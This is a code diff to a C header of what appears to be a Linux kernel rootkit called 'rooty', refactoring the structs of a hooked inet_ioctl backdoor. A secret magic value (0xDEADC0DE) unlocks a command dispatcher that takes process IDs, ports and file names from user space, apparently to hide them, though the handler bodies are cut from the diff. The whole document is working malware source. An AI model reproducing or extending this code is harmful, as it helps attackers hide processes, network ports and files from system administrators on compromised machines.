@@ -2,25 +2,7 @@
 #define IOCTL_H
 
 #include <linux/limits.h>
-
-#define AUTH_TOKEN 0xDEADC0DE
-
-struct s_args
-{
-    unsigned short cmd;
-    void *ptr;
-};
-
-struct s_proc_args
-{
-    pid_t pid;
-};
-
-struct s_file_args
-{
-    char *name;
-    unsigned short namelen;
-};
+#include "common/rooty_uapi.h"
 
 static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
 
@@ -42,7 +24,7 @@ void *get_inet_ioctl ( int family, int type, int protocol )
 static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
 {
     int ret;
-    struct s_args args;
+    struct rooty_args args;
 
     if ( cmd == AUTH_TOKEN )
     {
@@ -59,7 +41,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 1:
         {
-            struct s_proc_args proc_args;
+            struct rooty_proc_args proc_args;
             ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
             if ( ret )
                 return -EFAULT;
@@ -70,7 +52,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 2:
         {
-            struct s_proc_args proc_args;
+            struct rooty_proc_args proc_args;
             ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
             if ( ret )
                 return -EFAULT;
@@ -81,7 +63,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 3:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
 
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
@@ -93,7 +75,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 4:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
                 return -EFAULT;
@@ -104,7 +86,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 5:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
 
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
@@ -116,7 +98,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 6:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
                 return -EFAULT;
@@ -127,7 +109,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 7:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
                 return -EFAULT;
@@ -138,7 +120,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 8:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
                 return -EFAULT;
@@ -149,7 +131,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 9:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
                 return -EFAULT;
@@ -160,7 +142,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
         case 10:
         {
-            struct s_port_args port_args;
+            struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
             if ( ret )
                 return -EFAULT;
@@ -172,7 +154,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         case 11:
         {
             char *name;
-            struct s_file_args file_args;
+            struct rooty_file_args file_args;
             ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
             if ( ret )
                 return -EFAULT;
@@ -196,7 +178,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         case 12:
         {
             char *name;
-            struct s_file_args file_args;
+            struct rooty_file_args file_args;
             ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
             if ( ret )
                 return -EFAULT;
